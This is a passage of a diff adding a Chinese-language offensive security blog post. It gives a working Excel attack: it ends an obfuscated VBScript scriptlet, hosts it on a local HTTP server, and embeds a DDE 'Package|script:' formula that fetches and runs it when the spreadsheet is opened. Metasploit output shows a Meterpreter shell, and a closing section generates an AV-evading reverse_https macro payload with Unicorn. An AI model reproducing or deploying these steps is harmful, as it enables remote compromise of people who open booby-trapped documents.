+</span><span class="cp">    &#34;Select * from Win32_Process where Name=&#39;cscript.exe&#39; or  Name=&#39;wscript.exe&#39;&#34;,,48)
+</span><span class="cp">    For Each vdbGCrvsiz in vFVw
+</span><span class="cp">If Instr(1,vdbGCrvsiz.CommandLine, WScript.ScriptName,1)&gt; 0 Then
+</span><span class="cp">    vUC = vUC + 1
+</span><span class="cp">End If
+</span><span class="cp">    Next
+</span><span class="cp">vLQ = (vUC &gt; 1)
+</span><span class="cp">End Function
+</span><span class="cp">]]&gt;</span>
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/scriptlet&gt;</span></code></pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x04-使用python等开启http服务器">0x04 使用python等开启http服务器</h1>
+
+<p><code>php -S 0.0.0.0:8081</code><br />
+<code>python -m SimpleHTTPServer 8081</code><br />
+那么获取到x.xml的链接为<a href="http://10.10.10.2:8081/x.xml">http://10.10.10.2:8081/x.xml</a></p>
+
+<h1 id="0x05-新建一个execl-在任意处粘贴以下内容保存即可">0x05 新建一个execl.在任意处粘贴以下内容保存即可</h1>
+
+<p><code>=Package|'script:http://10.10.10.2:8081/x.xml'!''''</code></p>
+
+<h1 id="0x06-打开execl">0x06 打开execl</h1>
+
+<p><code>记得允许启动内容.或者更新内容</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[*] Sending stage (179779 bytes) to 10.10.10.27
+[*] Meterpreter session 1 opened (10.10.10.2:22222 -&gt; 10.10.10.27:49956) at 2017-12-19 20:45:30 +0800
+msf exploit(multi/script/web_delivery) &gt; sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter &gt; getuid
+Server username: X\evi1ox</pre></td></tr></table>
+</div>
+</div>
+<h1 id="0x07-彩蛋">0x07 彩蛋</h1>
+
+<p>使用<a href="https://github.com/trustedsec/unicorn.git">Magic Unicorn</a> &mdash;&mdash;  Bypass AV</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">&gt;&gt;&gt;kali_linux
+
+git clone https://github.com/trustedsec/unicorn.git
+<span class="nb">cd</span> unicorn
+python unicorn.py --help
+python unicorn.py windows/meterpreter/reverse_https cdn-01.example.com <span class="m">443</span> macro
+sudo msfconsole -r unicorn.rc
+
+&gt;&gt;&gt;windows
+
+打开 powershell_attack.txt执行即可
+当然这里powershell也可以植入execl中.规避一些waf及av</code></pre></td></tr></table>
+</div>
+</div>
+<p><a href="https://www.youtube.com/watch?v=P-iCeH3qNLw">https://www.youtube.com/watch?v=P-iCeH3qNLw</a></p>
+
+<p><a href="http://staaldraad.github.io/2017/10/23/msword-field-codes/">http://staaldraad.github.io/2017/10/23/msword-field-codes/</a></p>
+
+<p><a href="http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/">http://www.exploresecurity.com/from-csv-to-cmd-to-qwerty/</a></p>
+
+<p><a href="https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/">https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/</a></p>
+
+<p><a href="https://gist.githubusercontent.com/ssherei/41eab0f2c038ce8b355acf80e9ebb980/raw/0a3b7af41ac8c9a975cfeff2ab21c7eb5e6857a1/Modified-MS16-032.ps1">https://gist.githubusercontent.com/ssherei/41eab0f2c038ce8b355acf80e9ebb980/raw/0a3b7af41ac8c9a975cfeff2ab21c7eb5e6857a1/Modified-MS16-032.ps1</a></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/nas-ms17-010/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Nas_ms17_010</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/powershell-evasion/">
+            <span class="next-text nav-default">[译] Powershell-Evasion</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
